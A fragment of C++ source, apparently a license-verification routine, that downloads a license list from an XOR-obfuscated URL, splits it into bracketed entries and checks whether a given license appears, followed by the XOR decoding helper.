	string rawLicenseData = DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu}ax+uU"));
	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\r'), rawLicenseData.end());
	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\n'), rawLicenseData.end());
	while (rawLicenseData.find("]") != string::npos)
	{
		size_t Splitter = rawLicenseData.find("]");
		string aLicense = rawLicenseData.substr(0, Splitter + 1);
		allLicenses.push_back(aLicense);
		rawLicenseData.erase(0, Splitter + 1);
	}
	if (std::find(allLicenses.begin(), allLicenses.end(), License) != allLicenses.end())
	{
		return true;
	}
	else
	{
		return false;
	}
}
// Verify license - End

string decrypt2(string toEncrypt) {
    char key[8] = { 'Z', 'E', 'P', 'H', 'Y', 'R' }; //Any chars will work
    string output = toEncrypt;

    for (int i = 0; i < toEncrypt.size(); i++)
        output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

    return output;
}
